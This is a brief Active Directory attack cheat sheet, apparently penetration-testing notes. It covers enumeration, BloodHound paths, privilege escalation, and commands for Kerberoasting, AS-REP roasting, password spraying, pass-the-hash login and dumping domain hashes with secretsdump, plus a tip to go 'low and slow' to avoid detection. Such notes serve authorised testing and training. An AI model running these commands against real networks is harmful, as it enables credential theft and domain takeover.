# AD Attack Notes

## Initial Enumeration

**Indicators:**
- Kerberos
- LDAP
- SMB
- WinRM

## SMB Enumeration

**Check:**
- Shares
- Users
- RID Cycling
- Kerberoasting

**Crack:**
- AS-REP Roasting

**Commands:**
```text
nmap -sV -p 53,88,135,139,389,445,636,3268 TARGET
smbclient -L //TARGET -N
enum4linux -a TARGET
GetUserSPNs.py domain/user:pass -dc-ip IP -request
hashcat -m 13100 hash.txt wordlist
GetNPUsers.py domain/ -usersfile users.txt -no-pass
hashcat -m 18200 hashes.txt wordlist
```

## BloodHound

**Collection:**
- Full domain collection

**Look for:**
- GenericAll
- WriteDACL
- DCSync
- RBCD
- Shadow Credentials
- Password Spraying
- Pass The Hash

Low and slow.

## Common PrivEsc Paths in AD

- Kerberoast
- ACL Abuse
- GPP Passwords
- Unconstrained Delegation
- RBCD
- Token Abuse

**Impacket / tooling:**
```text
bloodhound-python -u USER -p PASS -d DOMAIN -c All
crackmapexec smb targets.txt -u users.txt -p Password123
evil-winrm -i TARGET -u administrator -H NTHASH
secretsdump.py domain/user@dc
```
